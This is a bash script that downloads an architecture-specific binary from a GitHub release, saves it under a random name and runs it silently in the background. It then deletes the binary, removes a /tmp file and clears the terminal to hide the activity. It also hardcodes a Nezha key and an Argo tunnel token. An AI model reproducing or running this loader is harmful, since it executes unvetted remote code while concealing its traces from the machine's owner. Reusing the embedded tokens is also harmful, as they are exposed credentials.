#!/bin/bash

export NEZHA_KEY='SlYhPows5oiaEt3VVN'
export ARGO_AUTH='eyJhIjoiYTUyYzFmMDk1MzAyNTU0YjA3NzJkNjU4ODI0MjRlMzUiLCJ0IjoiOGI5M2E5MzItZjZkOC00OWZiLWE5YzgtZDc2ODU0ZWMwYWUwIiwicyI6IlpqRTFZMk01TlRBdE1tVTNPQzAwTURZMExXRXlNR0V0TkdFelpqQmlOemRtWlRGaCJ9'
export ARGO_PORT='8001'
export FILE_PATH=${FILE_PATH:-'./'}

download_and_run() {
ARCH=$(uname -m) && FILE_INFO=()
if [ "$ARCH" == "arm" ] || [ "$ARCH" == "arm64" ] || [ "$ARCH" == "aarch64" ]; then
    FILE_INFO=("https://github.com/jpus/test/releases/download/web/bot-arm9 bot")
elif [ "$ARCH" == "amd64" ] || [ "$ARCH" == "x86_64" ] || [ "$ARCH" == "x86" ]; then
    FILE_INFO=("https://github.com/jpus/test/releases/download/web/bot-amd9 bot")
else
    echo "Unsupported architecture: $ARCH"
    exit 1
fi

declare -A FILE_MAP
generate_random_name() {
    local chars=abcdefghijklmnopqrstuvwxyz1234567890
    local name=""
    for i in {1..6}; do
        name="$name${chars:RANDOM%${#chars}:1}"
    done
    echo "$name"
}
download_file() {
    local URL=$1
    local NEW_FILENAME=$2

    if command -v curl >/dev/null 2>&1; then
        curl -L -sS -o "$NEW_FILENAME" "$URL"
        echo -e "\e[1;32mDownloaded $NEW_FILENAME by curl\e[0m"
    elif command -v wget >/dev/null 2>&1; then
        wget -q -O "$NEW_FILENAME" "$URL"
        echo -e "\e[1;32mDownloaded $NEW_FILENAME by wget\e[0m"
    else
        echo -e "\e[1;33mNeither curl nor wget is available for downloading\e[0m"
        exit 1
    fi
}
for entry in "${FILE_INFO[@]}"; do
    URL=$(echo "$entry" | cut -d ' ' -f 1)
    RANDOM_NAME=$(generate_random_name)
    NEW_FILENAME="${FILE_PATH}/$RANDOM_NAME"
    
    download_file "$URL" "$NEW_FILENAME"
    
    chmod +x "$NEW_FILENAME"
    FILE_MAP[$(echo "$entry" | cut -d ' ' -f 2)]="$NEW_FILENAME"
done
wait

if [ -e "${FILE_PATH}/$(basename ${FILE_MAP[bot]})" ]; then
     nohup "${FILE_PATH}/$(basename ${FILE_MAP[bot]})" >/dev/null 2>&1 &
     sleep 3
     echo -e "\e[1;32m$(basename ${FILE_MAP[bot]}) is running\e[0m" 
fi

for key in "${!FILE_MAP[@]}"; do
    if [ -e "${FILE_PATH}/$(basename ${FILE_MAP[$key]})" ]; then
        rm -rf "${FILE_PATH}/$(basename ${FILE_MAP[$key]})" >/dev/null 2>&1
    fi
done
}
download_and_run

sleep 3
rm -rf /tmp/fake_useragent_0.2.0.json >/dev/null 2>&1
clear
exit 0